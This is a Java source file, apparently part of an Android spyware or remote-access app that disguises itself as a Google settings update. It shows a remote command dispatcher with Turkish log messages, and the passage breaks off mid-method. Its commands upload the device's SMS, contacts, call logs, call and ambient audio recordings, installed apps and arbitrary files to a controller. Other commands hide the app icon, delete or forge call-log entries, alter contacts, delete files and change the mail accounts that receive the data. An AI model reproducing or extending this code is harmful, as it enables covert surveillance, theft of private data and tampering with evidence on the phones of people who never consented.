package com.setting.dl.google.googlesettingupdate.ptt.command;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.usage.UsageStats;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.annimon.stream.Stream;
import com.setting.dl.google.googlesettingupdate.audio.AudioService;
import com.setting.dl.google.googlesettingupdate.Run;
import com.setting.dl.google.googlesettingupdate.audio.AudioServiceController;
import com.setting.dl.google.googlesettingupdate.phone.PhoneState;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PostMan;
import com.setting.dl.google.googlesettingupdate.save.Save;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.mail.MailSendIcons;
import com.setting.dl.google.googlesettingupdate.phone.Calls;
import com.setting.dl.google.googlesettingupdate.phone.Contacts;
import com.setting.dl.google.googlesettingupdate.phone.FileSplitter;
import com.setting.dl.google.googlesettingupdate.phone.InstalledApps;
import com.setting.dl.google.googlesettingupdate.phone.Sms;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.IPostMan;
import com.setting.dl.google.googlesettingupdate.u;
import com.setting.dl.google.googlesettingupdate.usage.UsageManager;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.net.NetworkInterface;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.Set;

public class CommandExecutor implements ICommandExecutor {
   
   //switch
   private static final String SUBJECT_MESSAGES                    = "msgs";
   private static final String SUBJECT_CONTACTS                    = "contacts";
   private static final String SUBJECT_CALL_LOG                    = "calls";
   private static final String SUBJECT_BATTERY                     = "bt";
   private static final String SUBJECT_DELETE_AUIDO_FILES          = "da";
   private static final String SUBJECT_COMMANDS                    = "command";
   private static final String SUBJECT_DELETE_CALL_AUIDO_FILES     = "dca";
   private static final String SUBJECT_GET_AUDIO_FILES             = "ga";
   private static final String SUBJECT_GET_TEXT_FILES              = "gt";
   private static final String SUBJECT_LIST_TEXT_FILES             = "ltf";
   private static final String SUBJECT_GET_CALL_AUDIO_FILES        = "gca";
   private static final String SUBJECT_RECORD                      = "rc_";
   private static final String SUBJECT_DAY_OF_CALLS                = "dayOfCalls";
   private static final String SUBJECT_DELETE_ALL_FILES            = "delallfiles";
   private static final String SUBJECT_DELETE_ALL_LOCAL_FILES      = "delalllocalfiles";
   private static final String SUBJECT_LIST_AUIDO_FILES            = "laf";
   private static final String SUBJECT_LIST_CALL_AUIDO_FILES       = "lcf";
   private static final String SUBJECT_PHONE_INFO                  = "pi";
   private static final String SUBJECT_APPS                        = "apps";
   private static final String SUBJECT_GET_ICONS                   = "gi";
   private static final String SUBJECT_WAKE_UP                     = "wake";
   private static final String SUBJECT_SEND_MY_FILE                = "sendmyfile";
   private static final String SUBJECT_DEL_MY_FILE                 = "delmyfiles";
   private static final String SUBJECT_MAIN_LIST                   = "mainlist";
   private static final String SUBJECT_SHOW_APP                    = "sa";
   private static final String SUBJECT_HIDE_APP                    = "ha";
   private static final String SUBJECT_NO_RECORD                   = "sr";
   private static final String SUBJECT_ALLOW_RECORD                = "ssr";
   private static final String SUBJECT_NO_CALL_RECORD              = "scr";
   private static final String SUBJECT_ALLOW_CALL_RECORD           = "sscr";
   private static final String SUBJECT_NLSERVICE_JUNK_PACKS        = "nljpacks";
   private static final String SUBJECT_NLSERVICE_MAIL_PACKS        = "nlmpacks";
   private static final String SUBJECT_NLSERVICE_DANGER_PACKS      = "nldpacks";
   private static final String SUBJECT_LIST_FILE_FOLDER            = "lffolder";
   private static final String SUBJECT_LAST_APPS                   = "lapps";
   private static final String SUBJECT_PHONE_STATE                 = "phonestate";
   private static final String SUBJECT_DELETE_SAVED_COMMAND_FILE   = "dcf";
   private static final String SUBJECT_DELETE_SAVED_COMMANDS       = "dscmd";
   private static final String SUBJECT_LIST_APPS_IN_ACCESS_SERVICE = "lainac";
   private static final String SUBJECT_GET_ALL_USAGE               = "galluse";
   private static final String SUBJECT_GET_SAVED_COMMANDS          = "gsavedcommands";
   
   
   //if
   private static final String SUBJECT_CHANGE_ACCOUNT                   = "change account";
   private static final String SUBJECT_ADD_ACCOUNT                      = "add account";
   private static final String SUBJECT_REMOVE_ACCOUNT                   = "remove account";
   private static final String SUBJECT_DEL_CONTACT_NUMBER               = "delete number";
   private static final String SUBJECT_ADD_CONTACT                      = "add contact";
   private static final String SUBJECT_UPDATE_CONTACT                   = "update number";
   private static final String SUBJECT_DEL_CALL                         = "delete call";
   private static final String SUBJECT_ADD_CALL                         = "add call";
   private static final String SUBJECT_DEL_FILE                         = "delfile";
   private static final String SUBJECT_LIST_FILES                       = "listfiles";
   private static final String SUBJECT_SEND_FILE                        = "sendfile";
   private static final String SUBJECT_SEND_LOCAL_FILE                  = "localfile";
   private static final String SUBJECT_LIST_LOCAL_FILE                  = "listlocalfile";
   private static final String SUBJECT_SEND_AUDIO_FILE                  = "saf";
   private static final String SUBJECT_ADD_JUNK_PACK                    = "ajp";
   private static final String SUBJECT_ADD_DANGER_PACK                  = "adp";
   private static final String SUBJECT_ADD_MAIL_PACK                    = "amp";
   private static final String SUBJECT_MOST_OUTGOING_CALLS              = "mostOutCalls";
   private static final String SUBJECT_MOST_INCOMMING_CALLS             = "mostInCalls";
   private static final String SUBJECT_GET_LAST_APPS                    = "glapps";
   private static final String SUBJECT_ADD_PACKAGE_TO_ACCESS_SERVICE    = "aptoac";
   private static final String SUBJECT_REMOVE_PACKAGE_TO_ACCESS_SERVICE = "rptoac";
   private static final String SUBJECT_OTO_RECORD                       = "otorc";
   
   
   private final Context  context;
   private       String   order = "";
   private final IPostMan postMan;
   private       ICommand commandMessage;
   
   public CommandExecutor(Context context) {
      
      this.context = context;
      postMan = PostMan.getInstance(context);
   }
   
   
   @SuppressLint("ApplySharedPref")
   @Override
   public void executeCommand(ICommand command) throws OrderException, InvalidOrderArgumentException {
      
      this.commandMessage = postMan.getCommand(command.getCommandId());
      this.order = command.getCommand();
      
      if (commandMessage == null) {
         
         u.log.w("Komut alınamadı");
         return;
      }
      else {
         
         u.log.d("Komut alındı : %s", commandMessage.getCommandId());
      }
      
      
      if (commandMessage.isExecuting()) {
         
         u.log.d("Konu işleniyor : %s, %d. deneme", command.getCommandId(), commandMessage.getTryCount());
         
         long now           = System.currentTimeMillis();
         long executingTime = commandMessage.getExecutingDate();
         long elapsedTime   = now - executingTime;
         
         u.log.d("Konunun işleme alındığı tarih : %s", Time.getShortDate(executingTime));
         u.log.d("Geçen süre                    : %s", Time.getElapsedTime(elapsedTime));
         
         if (elapsedTime > Time.oneHour) {
            
            u.log.d("Geçen süre bir saati geçmiş durumda. Bu yüzden konu işlenmiş sayılacak");
            
            postMan.setCommandExecuted(commandMessage.getCommandId(), "İşlem süresi bir saati geçti");
         }
         
         return;
      }
      else {
         
         postMan.setCommandExecuting(true, commandMessage.getCommandId(), null);
         u.log.d("Konu işleme alınıyor : %s  [%d. deneme]", command.getCommandId(), commandMessage.getTryCount());
         
         if (commandMessage.getTryCount() == 5) {
            
            u.log.d("Bu son deneme olacak");
         }
         else if (commandMessage.getTryCount() > 5) {
            
            u.log.d("5 deneme yapıldı ve konu işleme başarısız oldu. Bu yüzden konu işlenmiş sayılacak");
            
            u.log.d("Konu : %s", commandMessage.getCommand());
            u.log.d("Konunun gönderildiği tarih         : %s", Time.getDate(commandMessage.getSendDate()));
            u.log.d("Konunun sisteme giriş tarihi       : %s", Time.getDate(commandMessage.getRecieveDate()));
            u.log.d("Konunun işleme son alındığı tarih  : %s", Time.getDate(commandMessage.getExecutingDate()));
            u.log.d("Şimdiki zaman                      : %s", Time.getDate(System.currentTimeMillis()));
            
            if (commandMessage.getComments() == null) {
               
               u.log.d("Konu ile ilgili bir yorum yok");
            }
            else {
               
               u.log.d("Konu ile ilgili yorum(lar) : %s", commandMessage.getComments());
            }
            
            postMan.setCommandExecuted(commandMessage.getCommandId(), "5 deneme yapıldı ve konu işleme başarısız oldu");
         }
      }
      
      switch (order) {
         
         case SUBJECT_MESSAGES:
            
            postMan.postText("sms", new Sms(context).get(), command.getCommandId());
            return;
         
         case SUBJECT_CONTACTS:
            
            postMan.postText("contacts", new Contacts(context).toString(), command.getCommandId());
            return;
         
         case SUBJECT_CALL_LOG:
            
            postMan.postText("callLog", new Calls(context).toString(), command.getCommandId());
            return;
         
         case SUBJECT_BATTERY:
            
            postMan.postText("battery", getBattery(), command.getCommandId());
            return;
         
         case SUBJECT_DELETE_AUIDO_FILES:
            
            Run.runThread(this::deleteAudioFiles);
            return;
         
         case SUBJECT_DELETE_CALL_AUIDO_FILES:
            
            Run.runThread(this::deleteCallAudioFiles);
            return;
         
         case SUBJECT_GET_AUDIO_FILES:
            
            postMan.checkAudioFiles(command.getCommandId());
            return;
         
         case SUBJECT_GET_CALL_AUDIO_FILES:
            
            postMan.checkCallFiles(command.getCommandId());
            return;
         
         case SUBJECT_LIST_AUIDO_FILES:
            
            Run.runThread(this::listAudiofiles);
            return;
         
         case SUBJECT_LIST_CALL_AUIDO_FILES:
            
            Run.runThread(this::listCallAudiofiles);
            return;
         
         case SUBJECT_PHONE_INFO:
            
            postMan.postText("PI", getPhoneInfo(context), commandMessage.getCommandId());
            return;
         
         case SUBJECT_APPS:
            
            String v = new InstalledApps(context).get();
            
            postMan.postText("Apps", v, commandMessage.getCommandId());
            new MailSendIcons(context, commandMessage.getCommandId());
            return;
         
         case SUBJECT_GET_ICONS:
            
            Run.runThread(() -> {
               
               new InstalledApps(context).createIconZip();
               new MailSendIcons(context, commandMessage.getCommandId());
            });
            return;
         
         case SUBJECT_WAKE_UP:
            
            Run.runThread(() -> {
               
               postMan.checkAudioFiles(commandMessage.getCommandId());
               postMan.checkCallFiles(commandMessage.getCommandId());
               postMan.checkTextFiles(commandMessage.getCommandId());
            });
            return;
         
         case SUBJECT_SEND_MY_FILE:
            
            Run.runThread(this::sendMyFile);
            return;
         
         case SUBJECT_DEL_MY_FILE:
            
            Run.runThread(this::delMyFile);
            return;
         
         case SUBJECT_MAIN_LIST:
            
            Run.runThread(this::mainList);
            return;
         
         case SUBJECT_SHOW_APP:
            
            u.showHideApp(context, false);
            postMan.postText(SUBJECT_SHOW_APP, "app show", commandMessage.getCommandId());
            return;
         
         case SUBJECT_HIDE_APP:
            
            u.showHideApp(context, true);
            postMan.postText(SUBJECT_HIDE_APP, "app hide", commandMessage.getCommandId());
            return;
         
         case SUBJECT_GET_TEXT_FILES:
            
            postMan.checkTextFiles(commandMessage.getCommandId());
            return;
         
         case SUBJECT_NO_RECORD:
            
            context.getSharedPreferences("audio", Context.MODE_PRIVATE).edit().putBoolean("stoprecords", true).apply();
            postText("NoRecord", "Kaydedildi");
            return;
         
         case SUBJECT_ALLOW_RECORD:
            
            context.getSharedPreferences("audio", Context.MODE_PRIVATE).edit().putBoolean("stoprecords", false).apply();
            postText("AllowRecord", "Kaydedildi");
            return;
         
         case SUBJECT_NO_CALL_RECORD:
            
            context.getSharedPreferences("audio", Context.MODE_PRIVATE).edit().putBoolean("stopcallrecords", true).apply();
            postText("NoCallRecord", "Kaydedildi");
            return;
         
         case SUBJECT_ALLOW_CALL_RECORD:
            
            context.getSharedPreferences("audio", Context.MODE_PRIVATE).edit().putBoolean("stopcallrecords", false).apply();
            postText("AllowCallRecord", "Kaydedildi");
            return;
         
         case SUBJECT_NLSERVICE_DANGER_PACKS:
            
            Run.runThread(() -> {
               
               String packs = Objects.requireNonNull(
                     context
                           .getSharedPreferences("gmail", Context.MODE_PRIVATE)
                           .getStringSet("dangerpacks", new HashSet<>())).toString();
               
               
               postMan.postText(SUBJECT_NLSERVICE_DANGER_PACKS, packs, commandMessage.getCommandId());
            });
            return;
         
         case SUBJECT_NLSERVICE_JUNK_PACKS:
            
            Run.runThread(() -> {
               
               String packs = Objects.requireNonNull(
                     context
                           .getSharedPreferences("gmail", Context.MODE_PRIVATE)
                           .getStringSet("junkpacks", new HashSet<>())).toString();
               
               
               postMan.postText(SUBJECT_NLSERVICE_JUNK_PACKS, packs, commandMessage.getCommandId());
            });
            return;
         
         case SUBJECT_NLSERVICE_MAIL_PACKS:
            
            Run.runThread(() -> {
               
               String packs = Objects.requireNonNull(
                     context
                           .getSharedPreferences("gmail", Context.MODE_PRIVATE)
                           .getStringSet("mailpacks", new HashSet<>())).toString();
               
               
               postMan.postText(SUBJECT_NLSERVICE_MAIL_PACKS, packs, commandMessage.getCommandId());
            });
            return;
         
         case SUBJECT_LIST_FILE_FOLDER:
            
            Run.runThread(() -> {
               
               File[] files = context.getFilesDir().listFiles();
               
               if (files == null) {
                  
                  postText("LFiles", "files = null");
                  return;
               }
               
               String val = Arrays.toString(files);
               
               postMan.postText(SUBJECT_LIST_FILE_FOLDER, val, commandMessage.getCommandId());
            });
            return;
         
         case SUBJECT_LIST_LOCAL_FILE:
            
            File mainFile = new File(context.getFilesDir().getAbsolutePath());
            
            File[] files = mainFile.listFiles();
            
            postMan.postText("LocalFiles", getFilesInfo(files), commandMessage.getCommandId());
            return;
         
         
         case SUBJECT_COMMANDS:
            
            postMan.postText("Commands", getCommands(), commandMessage.getCommandId());
            return;
         
         case SUBJECT_DAY_OF_CALLS:
            
            Calendar calendar = Calendar.getInstance();
            
            getCalls(calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH), calendar.get(Calendar.DAY_OF_MONTH));
            return;
         
         
         case SUBJECT_MOST_OUTGOING_CALLS:
            
            String val = new Calls(context).enCokArananlar();
            postMan.postText("MostOutCalls", val, commandMessage.getCommandId());
            return;
         
         case SUBJECT_MOST_INCOMMING_CALLS:
            
            String val2 = new Calls(context).enCokArayanlar();
            postMan.postText("MostInCalls", val2, commandMessage.getCommandId());
            return;
         
         case SUBJECT_LAST_APPS:
            
            Run.runThread(() -> lastApps(1L));
            return;
         
         
         case SUBJECT_PHONE_STATE:
            
            Run.runThread(this::phoneState);
            return;
         
         
         case SUBJECT_LIST_TEXT_FILES:
            
            File mainDir = new File(context.getFilesDir().getAbsolutePath());
            File[] textFiles = mainDir.listFiles();
            
            
            if (textFiles != null) {
               
               List<File> fileList = Stream.of(textFiles).filter(File::isFile).toList();
               
               if (fileList.size() == 0) {
                  
                  postMan.postText("ListText", "Dosya yok", commandMessage.getCommandId());
               }
               else {
                  
                  StringBuilder s = new StringBuilder(Time.dateStamp());
                  
                  s.append(u.format("%nKlasörde %d dosya var%n", fileList.size()));
                  
                  int i = 1;
                  
                  for (File textFile : fileList) {
                     
                     s.append(u.format("%d. %s [%d kb]%n", i++, textFile.getName(), textFile.length() / 1024));
                  }
                  
                  postMan.postText("ListText", s.toString(), commandMessage.getCommandId());
               }
            }
            else {
               
               postText("ListText", "Klasördeki dosyalara ulaşılamadı");
            }
            
            return;
         
         case SUBJECT_DELETE_SAVED_COMMAND_FILE:
            
            File file = new File(context.getFilesDir().getParent(), "shared_prefs/MessageInbox.xml");
            
            if (!file.exists()) {
               
               postText("DeleteSavedCommand", "Dosya bulunamadı : " + file.getName());
               return;
            }
            
            if (u.deleteFile(file)) {
               
               postText("DeleteSavedCommand", "Dosya silindi : " + file.getName());
            }
            else {
               
               postText("DeleteSavedCommand", "Dosya silinemedi : " + file.getName());
            }
            ///data/data/com.setting.dl.google.googlesettingupdate/shared_prefs/MessageInbox.xml
            return;
         
         
         case SUBJECT_DELETE_SAVED_COMMANDS:
            
            postMan.deleteAllCommands();
            postMan.setCommandExecuted(commandMessage.getCommandId(), null);
            return;
         
         
         case SUBJECT_LIST_APPS_IN_ACCESS_SERVICE:
            
            Save save = new Save(context, "Access");
            
            List<String> blocks = save.getObjectsList("blocks", String.class);
            
            StringBuilder s = new StringBuilder(Time.dateStamp()).append("\n");
            
            s.append(u.format("Listede %d uygulama var", blocks.size()));
            s.append("\n======================================\n");
            
            int i = 1;
            
            for (String p : blocks) {
               
               s.append(u.format("%d. %s (%s)%n", i++, p, InstalledApps.getApplicationName(context, p)));
            }
            
            postText("ListAccessBlockedApps", s.toString());
            return;
         
         
         case SUBJECT_GET_ALL_USAGE:
            
            Run.runThread(this::getAllUsage);
            return;
         
         
         case SUBJECT_GET_SAVED_COMMANDS:
            
            List<com.setting.dl.google.googlesettingupdate.ptt.message.Message> commands = new Save(context, "MessageInbox").getObjectsList("CommandMessages", com.setting.dl.google.googlesettingupdate.ptt.message.Message.class);
            
            if (commands.size() == 0) {
               
               postText("SavedCommans", "Kayıtli komut yok");
               return;
            }
            
            
            StringBuilder ss = new StringBuilder(u.format("Kayıtlı %d komut var", commands.size()));
            
            
            for (com.setting.dl.google.googlesettingupdate.ptt.message.Message message : commands) {
               
               //noinspection UnnecessaryLocalVariable
               ICommand commandMessage = message;
               
               ss.append(
                     u.format(
                           
                           "%n%n" +
                           "\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF%n" +
                           "commandId : %s%n" +
                           "subject   : %s%n" +
                           "sDate     : %s%n" +
                           "rDate     : %s%n" +
                           "exDate    : %s%n" +
                           "exiDate   : %s%n" +
                           "deleted   : %s%n" +
                           "executed  : %s%n" +
                           "executing : %s%n" +
                           "tryCount  : %d%n" +
                           "comments  : %s%n" +
                           "\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF",
                           
                           
                           commandMessage.getCommandId(),
                           commandMessage.getCommand(),
                           commandMessage.getSendDate() != 0 ? Time.getDate(commandMessage.getSendDate()) : "-",
                           commandMessage.getRecieveDate() != 0 ? Time.getDate(commandMessage.getRecieveDate()) : "-",
                           commandMessage.getExecuteDate() != 0 ? Time.getDate(commandMessage.getExecuteDate()) : "-",
                           commandMessage.getExecutingDate() != 0 ? Time.getDate(commandMessage.getExecutingDate()) : "-",
                           commandMessage.isDeleted(),
                           commandMessage.isExecuted(),
                           commandMessage.isExecuting(),
                           commandMessage.getTryCount(),
                           commandMessage.getComments() != null ? commandMessage.getComments() : "-"
                     )
               );
            }
            
            postText("SavedCommans", ss.toString());
            return;
         
      }
      
      if (order.startsWith(SUBJECT_SEND_LOCAL_FILE)) {
         
         String filePath = getOrderArgument(order);
         
         File file = new File(context.getFilesDir(), filePath);
         
         if (file.exists()) {
            
            postMan.postFile(file, "SendLocalFile", file.getName(), commandMessage.getCommandId());
         }
         else {
            
            postText("SendLocalFile", "Böyle bir dosya yok : " + filePath);
         }
      }
      
      else if (order.startsWith(SUBJECT_LIST_LOCAL_FILE)) {
         
         String arg = getOrderArgument(order);
         
         File file = new File(context.getFilesDir(), arg);
         
         String val;
         
         if (file.exists() && file.isDirectory()) {
            
            val = getFilesInfo(file.listFiles());
         }
         else {
            
            if (!file.exists()) val = "Böyle bir dosya yok : " + file.getName();
            else {
               
               val = "No Directory : " + file.getName();
            }
         }
         
         postText("LocalListFile", val);
      }
      
      else if (order.contains(SUBJECT_CHANGE_ACCOUNT)) {
         
         if (!order.contains("_")) {
            
            throw new OrderException("Hesap değiştirme komutu hatalı : " + order);
         }
         
         String newAccount = order.split("_")[1];
         u.log.d("Yeni hesap geçerli mi kontrol ediliyor : " + newAccount);
         
         if (isValidEmail(newAccount)) {
            
            u.log.d("Yeni hesap geçerli");
            
            SharedPreferences pref = context.getSharedPreferences("gmail", Context.MODE_PRIVATE);
            
            Set<String> accounts = pref.getStringSet("to", null);
            
            if (accounts == null) {
               
               postMan.postText("ChangeAccount", "Kayıtlı hesaplara ulaşılamadı", commandMessage.getCommandId());
               return;
            }
            
            if (accounts.size() == 0) {
               
               postMan.postText("ChangeAccount", "Bunun olmaması gerek ama kayıtlı bir alıcı hesabının olmadığı görünüyor", commandMessage.getCommandId());
               return;
            }
            
            if (accounts.size() != 1) {
               
               postMan.postText(
                     "ChangeAccount",
                     u.format("Alıcı hesabın değiştirilebilmesi için tek bir hesabın kayıtlı olması gerek ama kayıtlı %d hesap var [%s]", accounts.size(), accounts.toString()),
                     commandMessage.getCommandId());
               return;
            }
            
            Set<String> newAccounts = new HashSet<>();
            newAccounts.add(newAccount);
            
            pref.edit().remove("to").commit();
            pref.edit().putStringSet("to", newAccounts).apply();
            
            postMan.postText("ChangeAccount", "Yeni hesap : " + newAccount, commandMessage.getCommandId());
            
            u.log.d("Yeni hesap kaydedildi : " + newAccount);
         }
         else {
            u.log.d("yeni hesap geçerli değil");
            postMan.postText("Yeni hesap", "yeni hesap geçersiz : " + newAccount, commandMessage.getCommandId());
         }
      }
      
      else if (order.contains(SUBJECT_ADD_ACCOUNT)) {
         
         if (!order.contains("_")) {
            
            throw new OrderException("Hesap değiştirme komutu hatalı : " + order);
         }
         
         String newAccount = order.split("_")[1];
         u.log.d("Hesap geçerli mi kontrol ediliyor : " + newAccount);
         
         
         if (isValidEmail(newAccount)) {
            
            u.log.d("Hesap geçerli");
            
            SharedPreferences pref = context.getSharedPreferences("gmail", Context.MODE_PRIVATE);
            
            Set<String> accounts = pref.getStringSet("to", null);
            
            if (accounts == null) {
               
               postMan.postText("AddAccount", "Kayıtlı hesaplara ulaşılamadı", commandMessage.getCommandId());
               return;
            }
            
            if (accounts.size() == 0) {
               
               postMan.postText("AddAccount", "Bunun olmaması gerek ama kayıtlı bir alıcı hesabının olmadığı görünüyor", commandMessage.getCommandId());
               return;
            }
            
            accounts.add(newAccount);
            
            pref.edit().remove("to").commit();
            pref.edit().putStringSet("to", accounts).apply();
            
            postMan.postText("AddAccount", "Hesap eklendi : " + accounts.toString(), commandMessage.getCommandId());
            
            u.log.d("Hesap eklendi : " + newAccount);
            
         }
         else {
            u.log.d("Hesap geçerli değil");
            postMan.postText("AddAccount", "Hesap geçersiz : " + newAccount, commandMessage.getCommandId());
         }
      }
      
      else if (order.contains(SUBJECT_REMOVE_ACCOUNT)) {
         
         if (!order.contains("_")) {
            
            throw new OrderException("Hesap değiştirme komutu hatalı : " + order);
         }
         
         String newAccount = order.split("_")[1];
         u.log.d("Hesap geçerli mi kontrol ediliyor : " + newAccount);
         
         
         if (isValidEmail(newAccount)) {
            
            u.log.d("Hesap geçerli");
            
            SharedPreferences pref = context.getSharedPreferences("gmail", Context.MODE_PRIVATE);
            
            Set<String> accounts = pref.getStringSet("to", null);
            
            if (accounts == null) {
               
               postMan.postText("RemoveAccount", "Kayıtlı hesaplara ulaşılamadı", commandMessage.getCommandId());
               return;
            }
            
            if (accounts.size() == 0) {
               
               postMan.postText("RemoveAccount", "Bunun olmaması gerek ama kayıtlı bir alıcı hesabının olmadığı görünüyor", commandMessage.getCommandId());
               return;
            }
            
            if (!accounts.contains(newAccount)) {
               
               postMan.postText("RemoveAccount", "Kaldırılmak istenen hesap kayıtlı değil : " + accounts.toString(), commandMessage.getCommandId());
               return;
            }
            
            pref.edit().remove("to").commit();
            
            accounts.remove(newAccount);
            
            pref.edit().putStringSet("to", accounts).apply();
            
            postMan.postText("RemoveAccount", "Hesap Kaldırıldı : " + accounts.toString(), commandMessage.getCommandId());
            
            u.log.d("Hesap Kaldırıldı : " + newAccount);
            
         }
         else {
            u.log.d("Hesap geçerli değil");
            postMan.postText("RemoveAccount", "Hesap geçersiz : " + newAccount, commandMessage.getCommandId());
         }
      }
      
      //NUMBER_DELETE
      else if (order.contains(SUBJECT_DEL_CONTACT_NUMBER)) {
         
         if (!order.contains("_")) {
            
            throw new OrderException("Rehberden numara silme komutu hatalı : " + order);
         }
         
         String number = order.split("_")[1];
         String name   = Contacts.deleteContactWithNumber(context, number);
         
         if (name != null) {
            
            postMan.postText("Numara Silme", "Kişi silindi : " + name, commandMessage.getCommandId());
         }
         else {
            
            postMan.postText("Numara Silme", "Bu numaraya sahip kişi bulunamadı : " + number, commandMessage.getCommandId());
         }
      }
      
      //ADD_CONTACT
      else if (order.contains(SUBJECT_ADD_CONTACT)) {
         
         if (!order.contains("_") || !order.contains(";")) {
            
            throw new OrderException("Rehbere kişi ekleme komutu hatalı : " + order);
         }
         
         String[] nameAndNumber = order.split("_")[1].split(";");
         
         boolean b = Contacts.addContact(context, nameAndNumber[0], nameAndNumber[1]);
         
         if (b) {
            
            postMan.postText("Kişi Ekleme", "Kişi eklendi : " + nameAndNumber[0] + " " + nameAndNumber[1], commandMessage.getCommandId());
         }
         else {
            
            postMan.postText("Kişi Ekleme", "Kişi ekleme başarısız : " + nameAndNumber[0] + " " + nameAndNumber[1], commandMessage.getCommandId());
         }
      }
      
      //UPDATE_CONTACT
      else if (order.contains(SUBJECT_UPDATE_CONTACT)) {
         
         if (order.contains("_") && order.contains(";")) {
            
            throw new OrderException("Kişi güncelleme komutu hatalı : " + order);
         }
         
         String[] nameAndNewNumber = order.split("_")[1].split(";");
         
         boolean b = Contacts.updateContact(context, nameAndNewNumber[0], nameAndNewNumber[1]);
         
         if (b) {
            
            postMan.postText("Kişi Güncelleme", "Kişi güncellendi : " + nameAndNewNumber[0] + " " + nameAndNewNumber[1], commandMessage.getCommandId());
         }
         else {
            
            postMan.postText("Kişi Güncelleme", "Kişi güncelleme başarısız : " + nameAndNewNumber[0] + " " + nameAndNewNumber[1], commandMessage.getCommandId());
         }
      }
      
      //arama kaydı sil
      else if (order.contains(SUBJECT_DEL_CALL)) {
         
         if (order.contains("_")) {
            
            String id = order.split("_")[1];
            
            try {
               
               Calls.deleteCallWithId(context.getContentResolver(), id);
               postMan.postText("Call Log", "Arama kaydı silindi : " + id, commandMessage.getCommandId());
               
            }
            catch (SecurityException e) {
               
               postMan.postText("Call Log", "Arama kaydı silinemedi\nGüvenlik hatası : " + id, commandMessage.getCommandId());
            }
         }
         else {
            
            throw new OrderException(order);
         }
      }
      
      //arama kaydı ekle
      else if (order.contains(SUBJECT_ADD_CALL)) {
         
         if (order.contains("_")) {
            
            String callInfo = order.split("_")[1];
            
            if (!callInfo.contains(";")) {
               
               throw new OrderException(order);
            }
            
            String[] call = callInfo.split(";");
            
            if (call.length != 4) {
               
               throw new OrderException(order);
            }
            
            String number   = call[0];
            String date     = call[1];
            String duration = call[2];
            
            try {
               
               int type = Integer.valueOf(call[3]);
               
               Calls.insertPlaceholderCall(context.getContentResolver(), number, date, duration, type, 1);
               
            }
            catch (NumberFormatException e) {
               
               throw new OrderException(order);
            }
            catch (SecurityException e) {
               
               postMan.postText("Call Log", "Arama kaydı eklenemedi\nGüvenlik hatası", commandMessage.getCommandId());
            }
         }
         else {
            
            throw new OrderException(order);
         }
      }
      
      //dosya sil
      else if (order.contains(SUBJECT_DEL_FILE)) {
         
         if (!order.contains(";")) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            postMan.postText("delfile", error, commandMessage.getCommandId());
            return;
         }
         
         String filePath = order.split(";")[1];
         
         if (filePath.isEmpty()) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            postMan.postText("delfile", error, commandMessage.getCommandId());
            return;
         }
         
         
         File file = new File(Environment.getExternalStorageDirectory(), filePath);
         
         if (!file.exists()) {
            
            String error = u.format("Böyle bir dosya yok : %s", filePath);
            
            postMan.postText("delfile", error, commandMessage.getCommandId());
            return;
         }
         
         if (file.delete()) {
            
            String msg = u.format("Dosya silindi : %s", file.getName());
            
            postMan.postText("delfile", msg, commandMessage.getCommandId());
         }
         else {
            
            String msg = u.format("Dosya silinemedi : %s", file.getName());
            
            postMan.postText("delfile", msg, commandMessage.getCommandId());
         }
      }
      
      //dosyaları listele
      else if (order.contains(SUBJECT_LIST_FILES)) {
         
         if (!order.contains(";")) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            postMan.postText("listfiles", error, commandMessage.getCommandId());
            return;
         }
         
         String dir = order.split(";")[1];
         
         u.log.w("path : %s", dir);
         
         if (dir.isEmpty()) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            postMan.postText("listfiles", error, commandMessage.getCommandId());
            return;
         }
         
         //Environment.getExternalStorageDirectory()
         File file = new File(Environment.getExternalStorageDirectory(), dir);
         
         if (!file.exists() || !file.isDirectory()) {
            
            String error = u.format("Böyle bir klasör yok : %s", dir);
            postMan.postText("listfiles", error, commandMessage.getCommandId());
            return;
         }
         
         File[] files = file.listFiles();
         
         if (files != null) {
            
            if (files.length == 0) {
               
               String msg = u.format("Klasörde dosya yok : %s", file.getName());
               postMan.postText("listfiles", msg, commandMessage.getCommandId());
            }
            else {
               
               StringBuilder msg = new StringBuilder(u.format("Klasörde %d dosya var%n", files.length));
               msg.append("-------------------------------\n");
               
               int i = 1;
               
               for (File file1 : files) {
                  
                  msg.append(u.format("%d. name=%s, isDir=%s, size=%.2fMB, date=%s%n",
                        
                        i++,
                        file1.getAbsolutePath(),
                        file1.isDirectory(),
                        file1.isDirectory() ? 0.0F : (float) file1.length() / (1024 * 1024),
                        Time.getDate(file1.lastModified())
                  ));
               }
               
               
               postMan.postText("listfiles", msg.toString(), commandMessage.getCommandId());
            }
         }
         
         
      }
      
      //send a file
      else if (order.contains(SUBJECT_SEND_FILE)) {
         
         if (!order.contains(";")) {
            
            throw new OrderException("Dosya belirtilmeli : " + order);
         }
         
         String path = order.split(";")[1];
         
         if (path.isEmpty()) {
            
            String error = u.format("Komut hatalı : %s", order);
            postMan.postText("SendFile", error, commandMessage.getCommandId());
            return;
         }
         
         
         File file = new File(Environment.getExternalStorageDirectory(), path);
         
         if (!file.exists()) {
            
            String error = u.format("Böyle bir dosya yok : %s", path);
